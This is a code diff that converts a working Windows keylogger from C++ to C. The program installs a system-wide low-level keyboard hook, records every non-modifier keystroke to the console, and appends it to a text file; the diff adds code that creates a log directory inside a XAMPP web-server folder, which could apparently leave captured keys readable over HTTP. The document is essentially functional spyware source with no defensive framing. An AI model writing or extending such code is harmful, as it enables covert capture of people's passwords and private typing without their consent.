@@ -1,11 +1,11 @@
-#include <iostream>
-#include <fstream>
+#include <stdio.h>
 #include <windows.h>
+#include <direct.h>  // Include the header for _mkdir
 
 HHOOK hHook = NULL;
-std::ofstream logFile("keystrokes.txt", std::ios::app);
+FILE *logFile;
 
-char GetCharFromVKCode(int vkCode, bool shiftPressed) {
+char GetCharFromVKCode(int vkCode, int shiftPressed) {
     BYTE keyboardState[256] = { 0 };
     if (shiftPressed) {
         keyboardState[VK_SHIFT] = 0x80;
@@ -13,10 +13,10 @@ char GetCharFromVKCode(int vkCode, bool shiftPressed) {
 
     WCHAR buffer[2] = { 0 };
     ToUnicode(vkCode, 0, keyboardState, buffer, 2, 0);
-    return static_cast<char>(buffer[0]);
+    return (char)buffer[0];
 }
 
-bool IsSpecialKey(int vkCode) {
+int IsSpecialKey(int vkCode) {
     return (vkCode == VK_MENU || vkCode == VK_TAB || vkCode == VK_SHIFT || vkCode == VK_CONTROL);
 }
 
@@ -24,8 +24,8 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     static char previousChar = '\0';
 
     if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
-        int vkCode = ((LPKBDLLHOOKSTRUCT)lParam)->vkCode;
-        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
+        int vkCode = ((PKBDLLHOOKSTRUCT)lParam)->vkCode;
+        int shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;
 
         // Check if the key is a special key (Alt, Tab, Shift, Ctrl)
         if (!IsSpecialKey(vkCode)) {
@@ -36,8 +36,9 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
                 previousChar = c;
             } else {
                 // Output the character to the console and log file
-                std::cout << c << std::endl;
-                logFile << c << std::endl << std::flush;
+                printf("%c\n", c);
+                fprintf(logFile, "%c\n", c);
+                fflush(logFile);
                 previousChar = c;
             }
         }
@@ -46,13 +47,40 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
     return CallNextHookEx(hHook, nCode, wParam, lParam);
 }
 
+// Function to create directory if it doesn't exist
+void createDirectory(const char *path) {
+    if (_mkdir(path) != 0) {
+        // Directory already exists or failed to create
+    }
+}
+
 int main() {
     HINSTANCE hInstance = GetModuleHandle(NULL);
+    const char *logFilePath = "C:\\xampp\\htdocs\\FromScratch\\C\\dump\\keystrokes.txt";
+
+    // Extract the directory from the full path
+    char directory[MAX_PATH];
+    strcpy(directory, logFilePath);
+    char *lastBackslash = strrchr(directory, '\\');
+    if (lastBackslash != NULL) {
+        *lastBackslash = '\0';  // Null-terminate to get the directory
+    }
+
+    // Create the directory if it doesn't exist
+    createDirectory(directory);
+
+    // Set the path for the log file
+    logFile = fopen(logFilePath, "a");
+    if (logFile == NULL) {
+        perror("Failed to open log file");
+        return 1;
+    }
 
     hHook = SetWindowsHookEx(WH_KEYBOARD_LL, LowLevelKeyboardProc, hInstance, 0);
 
     if (hHook == NULL) {
-        std::cerr << "Failed to install hook: " << GetLastError() << std::endl;
+        fprintf(stderr, "Failed to install hook: %lu\n", GetLastError());
+        fclose(logFile);
         return 1;
     }
 
@@ -65,7 +93,7 @@ int main() {
 
     // Uninstall the hook
     UnhookWindowsHookEx(hHook);
-    logFile.close();
+    fclose(logFile);
 
     return 0;
 }
